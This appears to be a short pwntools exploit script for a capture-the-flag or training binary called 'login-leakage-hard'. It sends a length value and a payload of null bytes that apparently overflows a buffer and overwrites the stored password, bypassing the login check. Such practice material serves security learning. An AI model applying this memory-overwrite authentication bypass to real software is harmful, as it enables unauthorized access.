from pwn import *

p = process("./login-leakage-hard")

password_at_offset = 957

x = p.clean()
print(x)

payload = b""
payload += b"\x00" * password_at_offset
payload += b"\x00" * 8

p.sendline(str(password_at_offset + 8).encode())
p.sendline(payload)

print(p.clean())

p.close()
